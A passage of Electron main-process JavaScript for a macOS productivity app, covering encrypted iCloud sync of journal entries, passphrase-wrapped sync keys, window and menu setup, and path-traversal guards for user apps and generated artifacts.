                syncKeyState = 'plaintext'; syncKeyLocked = false;
                return Buffer.from(keyHex, 'hex');
            }
        }

        const cached = readCachedSyncKey();
        if (cached) { syncKeyState = 'local-only'; syncKeyLocked = false; return cached; }
        const key = crypto.randomBytes(32);
        cacheSyncKeyLocal(key);
        syncKeyState = 'local-only'; syncKeyLocked = false;
        return key;
    } catch (err) {
        console.error('Failed to resolve sync encryption key:', err.message);
        syncKeyState = 'none'; syncKeyLocked = false;
        return null;
    }
}

// Enable H6 protection (or upgrade a legacy plaintext / publish a local-only
// key): wrap the CURRENT raw key under `passphrase`, write it to iCloud, cache
// it locally, and delete the legacy plaintext file. The raw key is unchanged,
// so journal + backups already encrypted with it stay readable.
function setSyncPassphrase(passphrase) {
    if (!syncEncryptionKey) return { error: 'No sync key is available on this Mac to protect.' };
    if (!passphrase || String(passphrase).length < 8) return { error: 'Passphrase must be at least 8 characters.' };
    try {
        if (!fs.existsSync(ICLOUD_SYNC_DIR)) fs.mkdirSync(ICLOUD_SYNC_DIR, { recursive: true });
        fs.writeFileSync(SYNC_KEY_ENC_FILE, JSON.stringify(SyncKeyCrypto.wrapKey(syncEncryptionKey, passphrase)));
        cacheSyncKeyLocal(syncEncryptionKey);
        try { if (fs.existsSync(SYNC_KEY_FILE)) fs.unlinkSync(SYNC_KEY_FILE); }
        catch (e) { console.warn('[sync-key] could not remove legacy plaintext key:', e.message); }
        syncKeyState = 'passphrase'; syncKeyLocked = false;
        return { ok: true };
    } catch (e) { return { error: e.message }; }
}

// Unlock a locked Mac: unwrap the iCloud key with `passphrase`, cache it,
// resume sync. Flushes any journal writes that were held while locked.
function unlockSyncKeyWithPassphrase(passphrase) {
    const wrapped = readWrappedSyncKey();
    if (!wrapped) return { error: 'No passphrase-protected sync key found in iCloud.' };
    try {
        const raw = SyncKeyCrypto.unwrapKey(wrapped, passphrase);
        syncEncryptionKey = raw;
        cacheSyncKeyLocal(raw);
        syncKeyState = 'passphrase'; syncKeyLocked = false;
        try { flushJournal(); } catch {}
        return { ok: true };
    } catch (e) {
        return { error: e.code === 'WRONG_PASSPHRASE' ? 'Incorrect passphrase.' : e.message };
    }
}

// Re-wrap the current (unlocked) key under a new passphrase.
function changeSyncPassphrase(newPassphrase) {
    if (!syncEncryptionKey) return { error: 'Unlock sync on this Mac first.' };
    if (!newPassphrase || String(newPassphrase).length < 8) return { error: 'Passphrase must be at least 8 characters.' };
    try {
        fs.writeFileSync(SYNC_KEY_ENC_FILE, JSON.stringify(SyncKeyCrypto.wrapKey(syncEncryptionKey, newPassphrase)));
        syncKeyState = 'passphrase';
        return { ok: true };
    } catch (e) { return { error: e.message }; }
}

syncEncryptionKey = resolveSyncKey();
if (syncKeyLocked) console.warn('[sync-key] LOCKED — enter your sync passphrase to resume sync/backup on this Mac');
// L6: fail closed + warn. If key resolution failed outright, encryptFile /
// encryptJSON already throw (no plaintext journal/backup is ever written), but
// make the degraded state loud rather than silent.
else if (!syncEncryptionKey) console.error('[sync-key] NO sync key available — sync and backups are DISABLED (they fail closed; nothing is written unencrypted). Check disk permissions on the sync folder.');

// Start backup schedule on launch (after syncEncryptionKey is initialized)
startBackupSchedule();

function encryptJSON(data) {
    // Fail closed (H6): never write a plaintext journal entry when the key is
    // unavailable (sync locked / not set up). Callers run inside try/catch.
    if (!syncEncryptionKey) throw new Error('sync key unavailable — cannot encrypt journal entry');
    const plaintext = JSON.stringify(data);
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', syncEncryptionKey, iv);
    const encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
    const authTag = cipher.getAuthTag();
    // Format: ENC:<iv>:<authTag>:<ciphertext> (all base64)
    return ENC_PREFIX + [iv, authTag, encrypted].map(b => b.toString('base64')).join(':');
}

function decryptOrParseJSON(raw, opts = {}) {
    if (!raw || raw.length === 0) return null;
    if (!raw.startsWith(ENC_PREFIX)) {
        // Bare JSON (pre-encryption). Once a key exists, an unencrypted journal
        // file is either a genuine old entry (re-encrypted by startup
        // migration) or an injected one (data poisoning). Read it only inside
        // the compat window — unless the caller IS the migration converting it
        // (allowPlaintext). After the cutoff, treat plaintext as untrusted and
        // refuse. (SECURITY-AUDIT.md M2.)
        if (syncEncryptionKey && !opts.allowPlaintext && Date.now() > PLAINTEXT_COMPAT_UNTIL) {
            throw new Error('Refused an unencrypted journal file after the compat cutoff (M2)');
        }
        return JSON.parse(raw);
    }
    if (!syncEncryptionKey) {
        throw new Error('Encrypted file but no sync key available');
    }
    const parts = raw.slice(ENC_PREFIX.length).split(':');
    if (parts.length !== 3) throw new Error('Invalid encrypted format');
    const iv = Buffer.from(parts[0], 'base64');
    const authTag = Buffer.from(parts[1], 'base64');
    const ciphertext = Buffer.from(parts[2], 'base64');
    const decipher = crypto.createDecipheriv('aes-256-gcm', syncEncryptionKey, iv);
    decipher.setAuthTag(authTag);
    const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
    return JSON.parse(decrypted.toString('utf8'));
}

// Ensure machine sync directory exists
function ensureSyncDir() {
    if (!fs.existsSync(machineSyncDir)) {
        fs.mkdirSync(machineSyncDir, { recursive: true });
    }
}

// Tombstones older than this are pruned from this Mac's journal at startup.
// Must outlast any plausible offline-vacation window for a peer (Mac or
// phone) — if a peer with a stale live copy syncs AFTER we drop a tombstone,
// its stale live row would resurrect the key. 90 days is generous for the
// long-vacation case while keeping deletes from accumulating for years.
const TOMBSTONE_TTL_MS = 90 * 24 * 60 * 60 * 1000;

function pruneOldMacTombstones() {
    try {
        ensureSyncDir();
        const cutoff = Date.now() - TOMBSTONE_TTL_MS;
        let pruned = 0;
        for (const file of fs.readdirSync(machineSyncDir)) {
            if (!file.endsWith('.json') || file === 'machine-info.json') continue;
            const full = path.join(machineSyncDir, file);
            let entry;
            try { entry = decryptOrParseJSON(fs.readFileSync(full, 'utf8')); } catch { continue; }
            if (!entry || !entry.deleted) continue;
            const at = entry.modifiedAt ? Date.parse(entry.modifiedAt) : NaN;
            if (Number.isFinite(at) && at < cutoff) {
                try { fs.unlinkSync(full); pruned++; } catch { /* best-effort */ }
            }
        }
        if (pruned > 0) console.log(`[sync] pruned ${pruned} tombstone(s) older than 90 days`);
    } catch (err) {
        console.warn('[sync] tombstone prune failed:', err.message);
    }
}

// --- storage key migrations --------------------------------------------
// If we ever rename an app's storage key (e.g. app_schedule -> app_tasks),
// add a {from, to} entry here. At startup the Mac copies the value over
// and tombstones the old key — and because we go through writeChangeJournal
// + writeDeleteJournal, the rename also propagates to other Macs (iCloud
// merge) and to paired phones (channel push). To add a transform, supply
// `transform: (oldValue) => newValue`; otherwise the value moves verbatim.
//
// Phones run the same migrations from js/adapter/mobile-bridge.js so a
// single rename works end-to-end without per-platform coordination.
const STORAGE_MIGRATIONS = [
    // Example (commented):
    // { from: 'app_schedule', to: 'app_tasks' },
];

function runStorageMigrations() {
    for (const m of STORAGE_MIGRATIONS) {
        if (!m || !m.from || !m.to) continue;
        try {
            const has = dataStore.getAll();
            if (!(m.from in has) || (m.to in has)) continue; // nothing to move, or target already populated
            const value = typeof m.transform === 'function' ? m.transform(has[m.from]) : has[m.from];
            dataStore.set(m.to, value);
            writeChangeJournal(m.to, value);
            dataStore.delete(m.from);
            writeDeleteJournal(m.from);
            console.log(`[sync] migrated storage key "${m.from}" -> "${m.to}"`);
        } catch (err) {
            console.warn(`[sync] migration "${m.from}" -> "${m.to}" failed:`, err.message);
        }
    }
}

// Write a sync log entry for this machine
function writeSyncLog(message) {
    try {
        ensureSyncDir();
        const logFile = path.join(machineSyncDir, 'sync.log');
        const timestamp = new Date().toISOString();
        const entry = `[${timestamp}] ${message}\n`;
        fs.appendFileSync(logFile, entry);

        // Trim log to last 500 lines
        try {
            const content = fs.readFileSync(logFile, 'utf8');
            const lines = content.split('\n');
            if (lines.length > 500) {
                fs.writeFileSync(logFile, lines.slice(-500).join('\n'));
            }
        } catch {}
    } catch (err) {
        console.error('Sync log write failed:', err.message);
    }
}

// Keys to exclude from sync (machine-specific or transient).
// NOTE: these must match the RAW store key. Everything written through the
// renderer's StorageManager arrives here prefixed with `app_` — unprefixed
// entries silently match nothing (the original `'llm-logs'` etc. shipped
// log blobs through the iCloud journal for months before this was caught).
// OAuth tokens live in settingsStore (never synced) and Portfolio's price
// cache lives inside the synced `app_portfolio` blob, so neither needs an
// entry.
const SYNC_EXCLUDE_KEYS = new Set([
    // Transparency logs: machine-local diagnostics, large and append-heavy.
    // network-logs appears twice: NetworkLogger (main process) writes the
    // raw key straight to dataStore, while renderer-side StorageManager
    // writes would arrive prefixed.
    'app_llm-logs', 'app_search-logs', 'app_network-logs', 'network-logs',
    // Trading: historical OHLCV cache and full backtest artifacts are large
    // and re-fetchable/regenerable (the backtest engine is deterministic) —
    // only the small `app_trading` blob (strategies, accounts, backtest
    // metadata) syncs.
    'app_trading-ohlcv', 'app_trading-results',
    // Email cache: Gmail is the source of truth — each machine re-fetches
    // independently. Syncing the blob caused deletes on one machine to be
    // undone by stale blob writes from another.
    'app_email',
    // Analytics: install ID is per-machine, pending events are transient
    // (cleared on successful upload). Opt-in state is also per-machine by
    // design — users enable analytics separately on each device.
    'app_analytics',
    // Dictionary cache: a local LLM-response accelerator. Each machine
    // can rebuild it on demand; saved words and stats still sync.
    'app_dictionary-cache',
    // Assistant settings: every field is machine-specific — the selected
    // model, the list of locally installed Ollama models, and the per-model
    // "think" toggles all depend on what's installed on this particular Mac
    // (e.g. a Mac Studio can run a larger model a MacBook can't). Syncing
    // this forced one machine's model choice onto another. Conversations
    // (`app_agent-conversations`) are NOT excluded — chat history still syncs.
    'app_agent-settings'
]);

// Encode key to a safe, collision-free filename using hex encoding for non-safe chars
function keyToFilename(key) {
    return key.replace(/[^a-zA-Z0-9_-]/g, c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')) + '.json';
}

// --- journal write batching --------------------------------------------
// Renderer autosave can fire many `store-set` calls per second (every
// keystroke in notes/journal). Each write is a full encrypt + writeFileSync
// of the journal entry, which is wasted I/O when the user is mid-edit.
// We coalesce: stage the latest entry per key in `pendingJournal`, flush
// the whole map after the user has been quiet for JOURNAL_FLUSH_MS. The
// pending map also feeds readMacSyncSet so sync reads always see the
// freshest value, even before the file write lands.
const JOURNAL_FLUSH_MS = 500;
const pendingJournal = new Map(); // key -> { value, modifiedAt, deleted }
let pendingFlushTimer = null;

function flushJournal() {
    // Sync locked (H6): hold the pending writes in memory — don't clear or
    // attempt them — so nothing is lost or written unencrypted. unlockSyncKey*
    // calls flushJournal() again once the key is available.
    if (syncKeyLocked) return;
    if (pendingFlushTimer) { clearTimeout(pendingFlushTimer); pendingFlushTimer = null; }
    if (pendingJournal.size === 0) return;
    try { ensureSyncDir(); } catch { /* fall through */ }
    for (const [key, entry] of pendingJournal) {
        try {
            const journalFile = path.join(machineSyncDir, keyToFilename(key));
            const row = entry.deleted
                ? { key, value: null, deleted: true, modifiedAt: entry.modifiedAt, machineId }
                : { key, value: entry.value, modifiedAt: entry.modifiedAt, machineId };
            fs.writeFileSync(journalFile, encryptJSON(row));
        } catch (err) {
            console.error(`Sync journal write failed for key "${key}":`, err.message);
        }
    }
    pendingJournal.clear();
}

function scheduleJournalFlush() {
    if (pendingFlushTimer) clearTimeout(pendingFlushTimer);
    pendingFlushTimer = setTimeout(flushJournal, JOURNAL_FLUSH_MS);
}

// Write a change journal entry for a key
function writeChangeJournal(key, value) {
    if (SYNC_EXCLUDE_KEYS.has(key)) return;
    pendingJournal.set(key, { value, modifiedAt: new Date().toISOString() });
    scheduleJournalFlush();
    // Nudge any paired phones currently connected so they pull fresh state.
    // (The notifier debounces too; both windows are ~500ms, so a typing
    // burst produces at most one push + one journal write.)
    notifyChannelDataChanged(key);
}

// Write a tombstone for deleted keys
function writeDeleteJournal(key) {
    if (SYNC_EXCLUDE_KEYS.has(key)) return;
    pendingJournal.set(key, { deleted: true, modifiedAt: new Date().toISOString() });
    scheduleJournalFlush();
    notifyChannelDataChanged(key);
}

// Host of the end-to-end-encrypted phone<->Mac channel. Declared here (well
// above its setup code near the bottom of the file) because the startup sync
// merge runs at module load and calls notifyChannelDataChanged(), which reads
// this binding — a `let` declared later would be in its temporal dead zone and
// throw "Cannot access 'desktopChannel' before initialization" on every merge.
let desktopChannel = null;

// Merge changes from other machines on startup
function mergeFromOtherMachines() {
    // Sync locked (H6): no key to decrypt peers' entries or write merges back.
    // Pause until the user unlocks with their passphrase.
    if (syncKeyLocked) {
        writeSyncLog('Sync locked — enter your passphrase to resume merging');
        return { merged: 0, machines: [], locked: true };
    }
    // The merge compares our on-disk journal entries with the iCloud copies
    // from other Macs. Any debounced writes still in `pendingJournal` would
    // look stale on disk, so a Mac-from-iCloud entry could overwrite our
    // newer local edit. Flush first so the comparison is honest.
    flushJournal();
    try {
        if (!fs.existsSync(ICLOUD_SYNC_DIR)) {
            writeSyncLog('No sync directory found — skipping merge');
            return { merged: 0, machines: [] };
        }

        const machines = fs.readdirSync(ICLOUD_SYNC_DIR)
            .filter(d => {
                const fullPath = path.join(ICLOUD_SYNC_DIR, d);
                return d !== machineId && fs.statSync(fullPath).isDirectory();
            });

        if (machines.length === 0) {
            writeSyncLog('No other machines found — skipping merge');
            return { merged: 0, machines: [] };
        }

        let mergedCount = 0;

        for (const otherMachine of machines) {
            const otherDir = path.join(ICLOUD_SYNC_DIR, otherMachine);
            const files = fs.readdirSync(otherDir)
                .filter(f => f.endsWith('.json') && f !== 'machine-info.json');

            for (const file of files) {
                try {
                    const filePath = path.join(otherDir, file);

                    // Skip iCloud placeholder files (not yet downloaded)
                    if (file.startsWith('.') && file.endsWith('.icloud')) continue;
                    const stat = fs.statSync(filePath);
                    if (stat.size === 0) continue;

                    const raw = fs.readFileSync(filePath, 'utf8');
                    const entry = decryptOrParseJSON(raw);

                    if (!entry || !entry.key || !entry.modifiedAt) continue;
                    if (SYNC_EXCLUDE_KEYS.has(entry.key)) continue;

                    // Check if our local version is older
                    const localJournalFile = path.join(machineSyncDir, keyToFilename(entry.key));
                    let localModifiedAt = null;

                    if (fs.existsSync(localJournalFile)) {
                        try {
                            const localEntry = decryptOrParseJSON(fs.readFileSync(localJournalFile, 'utf8'));
                            localModifiedAt = localEntry ? localEntry.modifiedAt : null;
                        } catch {}
                    }

                    // Only merge if remote is newer
                    if (!localModifiedAt || new Date(entry.modifiedAt) > new Date(localModifiedAt)) {
                        if (entry.deleted) {
                            dataStore.delete(entry.key);
                            writeSyncLog(`Merged DELETE for "${entry.key}" from ${otherMachine}`);
                        } else {
                            dataStore.set(entry.key, entry.value);
                            writeSyncLog(`Merged UPDATE for "${entry.key}" from ${otherMachine}`);
                        }
                        // Update our local journal to reflect the merge (encrypted)
                        fs.writeFileSync(localJournalFile, encryptJSON({
                            key: entry.key,
                            value: entry.value,
                            deleted: entry.deleted || false,
                            modifiedAt: entry.modifiedAt,
                            machineId: entry.machineId,
                            mergedFrom: otherMachine
                        }));
                        // Tell connected phones a Mac-to-Mac merge changed
                        // their data — otherwise a task created on the Mac
                        // Studio would sit on this Mac until the phone next
                        // launched and re-synced.
                        notifyChannelDataChanged(entry.key);
                        mergedCount++;
                    }
                } catch (err) {
                    console.error(`Failed to merge ${file} from ${otherMachine}:`, err.message);
                }
            }
        }

        writeSyncLog(`Merge complete: ${mergedCount} changes from [${machines.join(', ')}]`);
        return { merged: mergedCount, machines };
    } catch (err) {
        console.error('Sync merge failed:', err);
        writeSyncLog(`Merge FAILED: ${err.message}`);
        return { merged: 0, machines: [], error: err.message };
    }
}

// Export current data to sync journal — only seeds keys that have no journal file yet.
// This avoids overwriting timestamps for data that hasn't actually changed,
// which would cause stale data to "win" over newer changes on other machines.
function exportToSyncJournal() {
    try {
        ensureSyncDir();
        const allData = dataStore.getAll();
        let count = 0;
        for (const key of Object.keys(allData)) {
            if (SYNC_EXCLUDE_KEYS.has(key)) continue;
            const journalFile = path.join(machineSyncDir, keyToFilename(key));
            if (!fs.existsSync(journalFile)) {
                writeChangeJournal(key, allData[key]);
                count++;
            }
        }
        if (count > 0) writeSyncLog(`Seeded ${count} new keys to sync journal`);
        return { success: true, count };
    } catch (err) {
        writeSyncLog(`Export FAILED: ${err.message}`);
        return { success: false, error: err.message };
    }
}

// Write machine info file
function writeMachineInfo() {
    try {
        ensureSyncDir();
        const infoFile = path.join(machineSyncDir, 'machine-info.json');
        fs.writeFileSync(infoFile, JSON.stringify({
            machineId,
            hostname: os.hostname(),
            platform: process.platform,
            arch: process.arch,
            lastSeen: new Date().toISOString(),
            appVersion: app.getVersion()
        }, null, 2));
    } catch (err) {
        console.error('Failed to write machine info:', err.message);
    }
}

// Migrate old journal files: fix filenames and encrypt plaintext files
function migrateJournalFiles() {
    try {
        if (!fs.existsSync(machineSyncDir)) return;
        const files = fs.readdirSync(machineSyncDir)
            .filter(f => f.endsWith('.json') && f !== 'machine-info.json');
        let migratedNames = 0;
        let encrypted = 0;
        for (const file of files) {
            try {
                const filePath = path.join(machineSyncDir, file);
                const raw = fs.readFileSync(filePath, 'utf8');

                // Decrypt or parse — handles both old plaintext and already-encrypted.
                // allowPlaintext: this IS the migration that re-encrypts plaintext,
                // so it must keep reading bare JSON even past the M2 cutoff.
                const entry = decryptOrParseJSON(raw, { allowPlaintext: true });
                if (!entry || !entry.key) continue;

                const correctName = keyToFilename(entry.key);
                const isCorrectName = file === correctName;
                const isEncrypted = raw.startsWith(ENC_PREFIX);

                // Re-encrypt plaintext files or fix filenames
                if (!isEncrypted && syncEncryptionKey) {
                    const targetPath = path.join(machineSyncDir, correctName);
                    fs.writeFileSync(targetPath, encryptJSON(entry));
                    if (!isCorrectName) fs.unlinkSync(filePath);
                    encrypted++;
                } else if (!isCorrectName) {
                    const newPath = path.join(machineSyncDir, correctName);
                    fs.renameSync(filePath, newPath);
                    migratedNames++;
                }
            } catch {}
        }
        if (migratedNames > 0) writeSyncLog(`Migrated ${migratedNames} journal filenames`);
        if (encrypted > 0) writeSyncLog(`Encrypted ${encrypted} plaintext journal files`);
    } catch (err) {
        console.error('Journal migration failed:', err.message);
    }
}

// Run sync on startup (and on page reload — renderer triggers this via IPC)
function initSync() {
    writeMachineInfo();
    migrateJournalFiles();
    writeSyncLog(`App started — machine: ${machineId}, hostname: ${os.hostname()}`);

    // Merge changes from other machines
    const result = mergeFromOtherMachines();

    // Export current state to journal (seeds journal for new machines)
    exportToSyncJournal();

    writeSyncLog(`Init sync complete — merged ${result.merged} changes`);
    return result;
}

// Run initial sync
const syncResult = initSync();

function createWindow(hash = '') {
    const win = new BrowserWindow({
        title: 'Anjadhe',
        width: 1400,
        height: 900,
        minWidth: 800,
        minHeight: 600,
        webPreferences: {
            nodeIntegration: false,
            contextIsolation: true,
            sandbox: false,
            // Required so the Browse sub-app can mount <webview>. Attached
            // webviews are hardened in the 'web-contents-created' handler
            // below — Node is off, sandboxed, no preload.
            webviewTag: true,
            preload: path.join(__dirname, 'preload.js')
        },
        titleBarStyle: 'hiddenInset', // Native macOS title bar
        trafficLightPosition: { x: 15, y: 15 },
        backgroundColor: '#ffffff',
        show: false // Don't show until ready
    });

    // The renderer's AppManager reads window.location.hash on init, so
    // passing e.g. "#notes" opens a secondary window directly on that app.
    win.loadFile('index.html', hash ? { hash } : undefined);

    // Show window when ready to prevent visual flash
    win.once('ready-to-show', () => {
        win.show();
    });

    // Defense-in-depth: block top-level navigation of the app shell.
    // The renderer is supposed to stay on the loaded index.html for the
    // lifetime of the window — any will-navigate firing here means a
    // bug or attack tried to swap the entire app for a remote URL.
    // Embedded <webview> navigation is a separate channel handled in
    // the web-contents-created listener above; this lock only covers
    // the BrowserWindow's own webContents.
    win.webContents.on('will-navigate', (event, url) => {
        const allowed = url.startsWith('file://') && url.includes('index.html');
        if (!allowed) {
            event.preventDefault();
            console.warn('[main] blocked will-navigate on main window:', url.slice(0, 120));
        }
    });

    // When the renderer cancels an unload (beforeunload sets returnValue —
    // only during a user-initiated memory rebuild the user is watching), Electron
    // fires this instead of showing a dialog itself. Show a native confirm so the
    // user can still leave. Note the inverted semantics: calling
    // event.preventDefault() here ALLOWS the unload to proceed.
    win.webContents.on('will-prevent-unload', (event) => {
        const choice = dialog.showMessageBoxSync(win, {
            type: 'question',
            buttons: ['Leave', 'Stay'],
            defaultId: 1,
            cancelId: 1,
            title: 'Building memory summary',
            message: 'Your memory summary is still being built.',
            detail: 'Leaving now stops it — what\'s already saved is kept, and the rest will be handled next time. Leave anyway?'
        });
        if (choice === 0) event.preventDefault(); // 0 = Leave → allow the unload
    });

    // Run sync merge whenever the page (re)loads (covers Cmd+R refresh).
    // Broadcast the result to every window so other open windows can
    // refresh their UI against any newly-merged changes.
    win.webContents.on('did-finish-load', () => {
        const result = mergeFromOtherMachines();
        if (result.merged > 0) {
            writeSyncLog(`Page load sync: merged ${result.merged} changes`);
        }
        broadcastToAllWindows('sync-merge-result', result);
    });

    win.on('closed', () => {
        if (mainWindow === win) {
            // Promote another open window so legacy mainWindow-typed
            // references (dialog parents, updater target) keep working.
            const remaining = BrowserWindow.getAllWindows().filter(w => !w.isDestroyed());
            mainWindow = remaining[0] || null;
        }
    });

    if (!mainWindow || mainWindow.isDestroyed()) {
        mainWindow = win;
    }
    return win;
}

// Create application menu
function createMenu() {
    const template = [
        {
            label: app.name,
            submenu: [
                { role: 'about' },
                {
                    label: 'Check for Updates…',
                    click: async () => {
                        const result = await UpdaterManager.check();
                        const target = getActiveWindow();
                        if (target) target.webContents.send('updater:manual-check-result', result);
                    }
                },
                { type: 'separator' },
                {
                    label: 'Settings...',
                    accelerator: 'CmdOrCtrl+,',
                    click: () => {
                        const target = getActiveWindow();
                        if (target) target.webContents.send('menu-action', 'settings');
                    }
                },
                {
                    label: 'Help',
                    click: () => {
                        const target = getActiveWindow();
                        if (target) target.webContents.send('menu-action', 'help');
                    }
                },
                { type: 'separator' },
                {
                    label: 'Lock',
                    accelerator: 'CmdOrCtrl+L',
                    click: () => {
                        broadcastToAllWindows('app-lock');
                    }
                },
                { type: 'separator' },
                { role: 'hide' },
                { role: 'hideOthers' },
                { role: 'unhide' },
                { type: 'separator' },
                { role: 'quit' }
            ]
        },
        {
            label: 'File',
            submenu: [
                {
                    label: 'New Action',
                    accelerator: 'CmdOrCtrl+Shift+N',
                    click: () => {
                        // Opens the quick-capture modal in the focused window.
                        // App-focused (menu accelerator), deliberately NOT a
                        // system-wide globalShortcut.
                        const target = getActiveWindow();
                        if (target) target.webContents.send('menu-action', 'new-action');
                    }
                },
                {
                    label: 'New Window',
                    accelerator: 'CmdOrCtrl+N',
                    click: () => {
                        createWindow();
                    }
                },
                {
                    label: 'New Window at…',
                    submenu: [
                        'Notes', 'Agent', 'Schedule', 'Goals', 'Focus',
                        'Journal', 'Email', 'Bookmarks'
                    ].map(label => ({
                        label,
                        click: () => createWindow('#' + label.toLowerCase())
                    }))
                },
                { type: 'separator' },
                { role: 'close' }
            ]
        },
        {
            label: 'Edit',
            submenu: [
                { role: 'undo' },
                { role: 'redo' },
                { type: 'separator' },
                { role: 'cut' },
                { role: 'copy' },
                { role: 'paste' },
                { role: 'selectAll' }
            ]
        },
        {
            label: 'View',
            submenu: [
                {
                    label: 'Toggle Dark Mode',
                    accelerator: 'CmdOrCtrl+Shift+D',
                    click: () => {
                        // Theme is persisted in StorageManager; broadcasting
                        // keeps every open window visually consistent.
                        broadcastToAllWindows('menu-action', 'toggle-theme');
                    }
                },
                { type: 'separator' },
                { role: 'reload' },
                { role: 'forceReload' },
                { role: 'toggleDevTools' },
                { type: 'separator' },
                { role: 'resetZoom' },
                { role: 'zoomIn' },
                { role: 'zoomOut' },
                { type: 'separator' },
                { role: 'togglefullscreen' }
            ]
        },
        // role: 'windowMenu' gives the native macOS Window menu, which
        // auto-lists every open window at the bottom — exactly what we
        // want for multi-window navigation.
        { role: 'windowMenu' }
    ];

    const menu = Menu.buildFromTemplate(template);
    Menu.setApplicationMenu(menu);
}

// ---------------------------------------------------------------------------
// User-built apps (docs/PLATFORM.md). Read-only listing of ~/Anjadhe/apps —
// each subfolder with a manifest.json is a candidate app. Parsing/validation
// happens in the renderer (AppManifest); here we only read files, cap sizes,
// and report per-app errors instead of throwing, so one broken folder can't
// hide the rest. ANJADHE_APPS_DIR overrides the location for isolated testing.
// ---------------------------------------------------------------------------
function getUserAppsDir() {
    return process.env.ANJADHE_APPS_DIR || path.join(os.homedir(), 'Anjadhe', 'apps');
}

// ---------------------------------------------------------------------------
// Maker artifacts — self-contained HTML artifacts the Maker build agent writes
// to ~/Anjadhe/artifacts/<id>/, served into a sandboxed <webview> via the
// anjadhe-artifact:// scheme. Unlike user-apps (a fixed 4-file allowlist),
// artifacts can have arbitrary files and subfolders (multi-page), so writes
// are gated by an EXTENSION allowlist plus per-file and per-artifact size caps.
// The same containment guarantee (no path escapes the artifact folder) is
// enforced in BOTH the write IPC and the protocol handler. ANJADHE_ARTIFACTS_DIR
// overrides the location for isolated testing.
// ---------------------------------------------------------------------------
function getArtifactsDir() {
    return process.env.ANJADHE_ARTIFACTS_DIR || path.join(os.homedir(), 'Anjadhe', 'artifacts');
}

const ARTIFACT_EXT_ALLOW = new Set(['.html', '.css', '.js', '.json', '.svg', '.png', '.jpg', '.jpeg', '.md', '.txt', '.webp', '.gif', '.ico']);
const ARTIFACT_MAX_BYTES = 5 * 1024 * 1024;        // per file
const ARTIFACT_MAX_TOTAL_BYTES = 25 * 1024 * 1024; // per artifact folder
const ARTIFACT_MIME = {
    '.html': 'text/html; charset=utf-8', '.css': 'text/css; charset=utf-8',
    '.js': 'text/javascript; charset=utf-8', '.json': 'application/json; charset=utf-8',
    '.svg': 'image/svg+xml', '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg',
    '.webp': 'image/webp', '.gif': 'image/gif', '.ico': 'image/x-icon',
    '.md': 'text/markdown; charset=utf-8', '.txt': 'text/plain; charset=utf-8'
};

// Resolve an artifact id (a folder name) into a path contained in the
// artifacts dir. Same traversal guard as resolveUserAppDir.
function resolveArtifactDir(id) {
    if (typeof id !== 'string' || !id || id.includes('/') || id.includes('\\') || id.startsWith('.')) {
        return null;
    }
    const resolved = path.resolve(getArtifactsDir(), id);
    return resolved.startsWith(getArtifactsDir() + path.sep) ? resolved : null;
}

// Resolve a relative path WITHIN an artifact, allowing subfolders (multi-page)
// but refusing anything that escapes the artifact dir, hits a dotfile, or
// carries a disallowed extension. Returns the absolute path or null.
function resolveArtifactFile(id, relPath) {
    const dir = resolveArtifactDir(id);
    if (!dir || typeof relPath !== 'string' || !relPath) return null;
    // Normalize, strip any leading slash so it's always relative to the dir.
    const rel = relPath.replace(/^[/\\]+/, '');
    const abs = path.resolve(dir, rel);
    if (abs !== dir && !abs.startsWith(dir + path.sep)) return null;
    if (rel.split(/[/\\]/).some(seg => seg.startsWith('.'))) return null;
    if (!ARTIFACT_EXT_ALLOW.has(path.extname(abs).toLowerCase())) return null;
    return abs;
}

function artifactDirSize(dir) {
    let total = 0;
    const walk = (d) => {
        for (const ent of fs.readdirSync(d, { withFileTypes: true })) {
            if (ent.name.startsWith('.')) continue;
            const p = path.join(d, ent.name);
            if (ent.isDirectory()) walk(p);
            else { try { total += fs.statSync(p).size; } catch {} }
        }
    };
    try { walk(dir); } catch {}
    return total;
}

// Resolve an app dir name from the renderer into a path safely contained in
// the apps dir — dir names come back over IPC, so traversal must be refused.
function resolveUserAppDir(dirName) {
    if (typeof dirName !== 'string' || !dirName || dirName.includes('/') || dirName.includes('\\') || dirName.startsWith('.')) {
        return null;
    }
    const resolved = path.resolve(getUserAppsDir(), dirName);
    return resolved.startsWith(getUserAppsDir() + path.sep) ? resolved : null;
}

// Watch the apps dir and tell renderers which app folders changed, debounced
// so one save (editors often write multiple fs events) means one reload.
// .errors.log and other dotfiles are ignored — the renderer writes the error
// log via IPC, and reloading on that write would loop forever.
let userAppsWatcher = null;
function startUserAppsWatcher() {
    if (userAppsWatcher) return;
    const dir = getUserAppsDir();
    if (!fs.existsSync(dir)) return;
    let pendingDirs = new Set();
    let flushTimer = null;
    try {
        userAppsWatcher = fs.watch(dir, { recursive: true }, (eventType, filename) => {
            if (!filename) return;
            const parts = filename.split(path.sep);
            const appDir = parts[0];
            const base = parts[parts.length - 1];
            if (!appDir || appDir.startsWith('.') || base.startsWith('.')) return;
            // Ignore writes anywhere under a dot-folder (e.g. .builder/history.json)
            // so persisting builder memory doesn't trigger a hot-reload cycle.
            if (parts.some(p => p.startsWith('.'))) return;
            if (parts.length === 1 && !fs.existsSync(path.join(dir, appDir))) {
                // top-level deletion still counts — renderer unmounts it
            }
            pendingDirs.add(appDir);
            clearTimeout(flushTimer);
            flushTimer = setTimeout(() => {
                const dirs = [...pendingDirs];
                pendingDirs = new Set();
                for (const win of BrowserWindow.getAllWindows()) {
                    win.webContents.send('user-apps-changed', dirs);
                }
            }, 400);
        });
    } catch (e) {
        console.error('[user-apps] watcher failed to start:', e.message);
    }
}

ipcMain.handle('user-apps-status', () => {
    const dir = getUserAppsDir();
    return { enabled: fs.existsSync(dir), dir };
});

// Write (or refresh) the agent docs in the apps dir. They're platform
// docs, not user files — every release may change the contract, so they
// must track the app version, not the moment the user clicked Enable.
// Content-compared before writing so unchanged docs don't churn mtimes
// (and the file watcher).
function refreshUserAppsDocs() {
    const dir = getUserAppsDir();
    if (!fs.existsSync(dir)) return false;
    try {
        const { AGENT_DOCS } = require('./js/main/user-apps-template.js');
        for (const name of ['CLAUDE.md', 'AGENTS.md']) {
            const p = path.join(dir, name);
            let current = null;
            try { current = fs.readFileSync(p, 'utf8'); } catch {}
            if (current !== AGENT_DOCS) fs.writeFileSync(p, AGENT_DOCS);
        }
